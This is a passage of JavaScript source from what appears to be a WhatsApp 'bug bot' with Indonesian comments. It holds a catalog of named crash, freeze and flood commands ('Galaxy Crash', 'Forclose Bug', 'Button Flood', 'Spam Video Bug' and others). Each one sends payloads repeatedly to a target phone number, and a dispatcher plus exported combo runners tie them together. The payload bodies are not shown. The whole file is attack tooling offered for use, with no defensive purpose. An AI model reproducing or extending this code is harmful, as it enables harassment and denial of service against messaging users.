        if (log) log(`[Group Status Bug] ${i + 1}/${count}`);
        await sendGroupStatusBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendLegacyCrash",
    name: "Send Legacy Crash",
    category: "single",
    description: "Payload Legacy Interactive Header",
    aliases: ["legacy-crash", "legacycrash"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Legacy Crash] ${i + 1}/${count}`);
        await sendLegacyCrash(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendGalaxyCrash",
    name: "Send Galaxy Crash",
    category: "single",
    description: "Payload Galaxy List Carousel Message",
    aliases: ["galaxy-crash", "galaxycrash"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Galaxy Crash] ${i + 1}/${count}`);
        await sendGalaxyCrash(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendDelayHardBug",
    name: "Send Delay Hard Bug",
    category: "single",
    description: "Payload Delay Hard Interactive Header",
    aliases: ["delay-hard-bug", "delayhardbug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Delay Hard Bug] ${i + 1}/${count}`);
        await sendDelayHardBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendStatusMentionCrash",
    name: "Send Status Mention Crash",
    category: "single",
    description: "Payload Status Mention Group Invitation",
    aliases: ["status-mention-crash", "statusmentioncrash"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Status Mention Crash] ${i + 1}/${count}`);
        await sendStatusMentionCrash(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendStatusMentionProtocol",
    name: "Send Status Mention Protocol",
    category: "single",
    description: "Payload Protocol Mention Status",
    aliases: ["status-mention-protocol", "statusmentionprotocol"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Status Protocol] ${i + 1}/${count}`);
        await sendStatusMentionProtocol(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendCallPermissionBug",
    name: "Send Call Permission Bug",
    category: "single",
    description: "Payload Call Permission Request",
    aliases: ["call-permission-bug", "callpermissionbug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Call Permission Bug] ${i + 1}/${count}`);
        await sendCallPermissionBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendInvoicePaymentBug",
    name: "Send Invoice Payment Bug",
    category: "single",
    description: "Payload Invoice Payment Request Payment",
    aliases: ["invoice-payment-bug", "invoicepaymentbug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Invoice Payment Bug] ${i + 1}/${count}`);
        await sendInvoicePaymentBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendProtocolRepeatBug",
    name: "Send Protocol Repeat Bug",
    category: "single",
    description: "Payload Protocol Repeat Sequence",
    aliases: ["protocol-repeat-bug", "protocolrepeatbug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Protocol Repeat] ${i + 1}/${count}`);
        await sendProtocolRepeatBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendCrashClickBug",
    name: "Send Crash Click Bug",
    category: "single",
    description: "Payload Interactive Button Tap Overflow",
    aliases: ["crash-click-bug", "crashclickbug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Crash Click Bug] ${i + 1}/${count}`);
        await sendCrashClickBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendGroupCrash",
    name: "Send Group Crash",
    category: "single",
    description: "Payload Group Invite / Crash Message",
    aliases: ["group-crash", "groupcrash"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Group Crash] ${i + 1}/${count}`);
        await sendGroupCrash(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendLocationCrash2",
    name: "Send Location Crash V2",
    category: "single",
    description: "Payload Location Degree Extreme Overflow",
    aliases: ["location-crash-2", "locationcrash2"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Location Crash V2] ${i + 1}/${count}`);
        await sendLocationCrash2(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendViewOnceBug",
    name: "Send View Once Bug",
    category: "single",
    description: "Payload View Once Video & Image Interactive",
    aliases: ["view-once-bug", "viewoncebug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[View Once Bug] ${i + 1}/${count}`);
        await sendViewOnceBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendDelayBlankBug",
    name: "Send Delay Blank Bug",
    category: "single",
    description: "Payload Blank Delay Message",
    aliases: ["delay-blank-bug", "delayblankbug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Delay Blank Bug] ${i + 1}/${count}`);
        await sendDelayBlankBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendPaymentInviteBug",
    name: "Send Payment Invite Bug",
    category: "single",
    description: "Payload Payment Invite Service Notification",
    aliases: ["payment-invite-bug", "paymentinvitebug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Payment Invite] ${i + 1}/${count}`);
        await sendPaymentInviteBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendInteractiveFloodBug",
    name: "Send Interactive Flood Bug",
    category: "single",
    description: "Payload Interactive Message Flood Cards",
    aliases: ["interactive-flood-bug", "interactivefloodbug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Interactive Flood] ${i + 1}/${count}`);
        await sendInteractiveFloodBug(sock, target, 1);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendStatusBug",
    name: "Send Status Bug",
    category: "single",
    description: "Payload Status Mention Notification",
    aliases: ["status-bug", "statusbug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Status Bug] ${i + 1}/${count}`);
        await sendStatusBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendFullDelayBug",
    name: "Send Full Delay Bug",
    category: "single",
    description: "Payload Full Delay Interactive",
    aliases: ["full-delay-bug", "fulldelaybug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Full Delay Bug] ${i + 1}/${count}`);
        await sendFullDelayBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendButtonFloodBug",
    name: "Send Button Flood Bug",
    category: "single",
    description: "Payload Flood Buttons Array",
    aliases: ["button-flood-bug", "buttonfloodbug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Button Flood Bug] ${i + 1}/${count}`);
        await sendButtonFloodBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendGear4Bug",
    name: "Send Gear 4 Bug",
    category: "single",
    description: "Payload Gear 4 Interactive Flow Attack",
    aliases: ["gear4-bug", "gear4bug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Gear 4 Bug] ${i + 1}/${count}`);
        await sendGear4Bug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendQuickReplyBug",
    name: "Send Quick Reply Bug",
    category: "single",
    description: "Payload Quick Reply Interactive",
    aliases: ["quick-reply-bug", "quickreplybug"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Quick Reply Bug] ${i + 1}/${count}`);
        await sendQuickReplyBug(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendSpamBkpVideo",
    name: "Send Spam Video Bug",
    category: "single",
    description: "Payload Spam Video Buffer Message",
    aliases: ["spam-video-bug", "spambkpvideo"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Spam Video Bug] ${i + 1}/${count}`);
        await sendSpamBkpVideo(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "sendGroupStatusMention",
    name: "Send Group Status Mention",
    category: "single",
    description: "Payload Request Payment Mention Relay",
    aliases: ["group-status-mention", "groupstatusmention"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        if (log) log(`[Group Status Mention] ${i + 1}/${count}`);
        await sendGroupStatusMention(sock, target);
        if (i < count - 1) await sleep(delay);
      }
    }
  },

  // --- Kategori: UTILITY & TESTING ---
  {
    id: "test-message",
    name: "Standard Test Message",
    category: "utility",
    description: "Kirim pesan verifikasi teks biasa ke target",
    aliases: ["test", "msg"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        const testMsg = `⚡ [NDIKA BOT - TEST MESSAGE #${i + 1}/${count}]
` +
                        `• Waktu: ${new Date().toLocaleString("id-ID")}
` +
                        `• Mode: Automated Test Verification
` +
                        `• Status: Sukses terkirim melalui API Dashboard.`;
        await sock.sendMessage(target, { text: testMsg });
        if (log) log(`[Test Message] ${i + 1}/${count} terkirim`);
        if (i < count - 1) await sleep(delay);
      }
    }
  },
  {
    id: "ping",
    name: "Ping Latency Check",
    category: "utility",
    description: "Kirim ping teks responsivitas ke target",
    aliases: ["p"],
    execute: async (sock, target, count, delay, log) => {
      for (let i = 0; i < count; i++) {
        await sock.sendMessage(target, { text: `🏓 Pong! Bot aktif pada ${new Date().toISOString()}` });
        if (log) log(`[Ping] ${i + 1}/${count} terkirim`);
        if (i < count - 1) await sleep(delay);
      }
    }
  }
];

// Helper pencari command
function findCommand(nameOrAlias) {
  if (!nameOrAlias) return null;
  const clean = String(nameOrAlias).trim().toLowerCase();
  return COMMAND_CATALOG.find((c) => {
    if (c.id.toLowerCase() === clean) return true;
    if (c.name.toLowerCase() === clean) return true;
    return c.aliases && c.aliases.some((a) => a.toLowerCase() === clean);
  });
}

function getAllCommandsMetadata() {
  return COMMAND_CATALOG.map((c) => ({
    id: c.id,
    name: c.name,
    category: c.category,
    description: c.description,
    aliases: c.aliases
  }));
}

async function executeSenderCommand(sock, { command, target, count = 1, delayMs = 1000, logger = null, onProgress = null }) {
  const cmd = findCommand(command);
  if (!cmd) {
    throw new Error(`Perintah sender '${command}' tidak ditemukan dalam katalog.`);
  }

  // Format JID
  let cleanTarget = String(target).trim();
  let targetJid = cleanTarget;
  if (!targetJid.includes("@")) {
    const digitsOnly = targetJid.replace(/[^0-9]/g, "");
    targetJid = digitsOnly + "@s.whatsapp.net";
  }

  const sanitizedCount = Math.max(1, Math.min(count, 100));
  const sanitizedDelay = Math.max(50, Math.min(delayMs, 10000));

  const logFn = (msg) => {
    if (logger && typeof logger.info === "function") logger.info(msg);
    if (typeof onProgress === "function") onProgress(msg);
  };

  logFn(`Memulai eksekusi '${cmd.name}' (${cmd.id}) -> Target: ${targetJid} (Jumlah: ${sanitizedCount}, Jeda: ${sanitizedDelay}ms)`);

  await cmd.execute(sock, targetJid, sanitizedCount, sanitizedDelay, logFn);

  logFn(`Selesai mengeksekusi '${cmd.name}' (${cmd.id}) untuk target: ${targetJid}`);
  return {
    commandId: cmd.id,
    commandName: cmd.name,
    target: targetJid,
    count: sanitizedCount,
    delayMs: sanitizedDelay
  };
}

module.exports = {
  COMMAND_CATALOG,
  getAllCommandsMetadata,
  findCommand,
  executeSenderCommand,
  // Ekspor semua fungsi individual untuk digunakan langsung oleh handler.js
  sendAddressCrash,
  sendForcloseBug,
  sendLocationCrash,
  sendButtonBug,
  sendGroupStatusBug,
  sendLegacyCrash,
  sendGalaxyCrash,
  sendDelayHardBug,
  sendStatusMentionCrash,
  sendStatusMentionProtocol,
  sendCallPermissionBug,
  sendInvoicePaymentBug,
  sendProtocolRepeatBug,
  sendCrashClickBug,
  sendGroupCrash,
  sendLocationCrash2,
  sendViewOnceBug,
  sendDelayBlankBug,
  sendPaymentInviteBug,
  sendInteractiveFloodBug,
  sendStatusBug,
  sendFullDelayBug,
  sendButtonFloodBug,
  sendGear4Bug,
  sendQuickReplyBug,
  sendSpamBkpVideo,
  sendGroupStatusMention,
  // Ekspor runners combo
  runBlankCombo,
  runCombo,
  runComboV2,
  runFreeze,
  runBlast,
  runOverdrive,
  runClick,
  runDelay,
  runPushMedia,
  runGroupTest
};
